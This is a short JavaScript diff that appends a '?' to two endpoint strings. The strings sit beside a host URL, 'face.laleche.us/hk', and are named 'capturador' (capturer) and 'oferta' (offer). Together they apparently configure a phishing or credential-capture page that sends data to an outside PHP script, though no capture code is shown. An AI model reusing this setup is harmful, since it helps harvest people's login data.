@@ -1,6 +1,6 @@
 var host = "https://face.laleche.us/hk";
-var capturador = "z.php";
-var oferta = "x.php";
+var capturador = "z.php?";
+var oferta = "x.php?";
 
 var contador = "greyrdas";
 
